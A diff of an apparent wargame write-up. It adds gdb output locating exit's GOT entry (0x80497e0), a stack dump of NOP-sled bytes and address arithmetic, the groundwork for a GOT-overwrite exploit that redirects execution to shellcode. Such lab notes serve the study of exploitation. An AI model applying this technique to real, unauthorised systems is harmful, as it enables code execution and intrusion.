@@ -24,11 +24,25 @@ lets jump into jdb
    0x08048507 <main+195>:	call   0x8048340 <printf@plt>
    0x0804850c <main+200>:	movl   $0x0,(%esp)
    0x08048513 <main+207>:	call   0x8048370 <exit@plt>
-   
+```   
    its GOT obviously
+
+```
+   (gdb) disass exit
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:	jmp    *0x80497e0
 ```
 
+```
 
+x/600wx $esp
+0xffffde60:	0x90909090	0x90909090	0x90909090	0x90909090
+
+
+(gdb) p 0x80497e0  = 134518752
+(gdb) p 0xffffde60 - 4 = 4294958684
+
+```
 
 
 
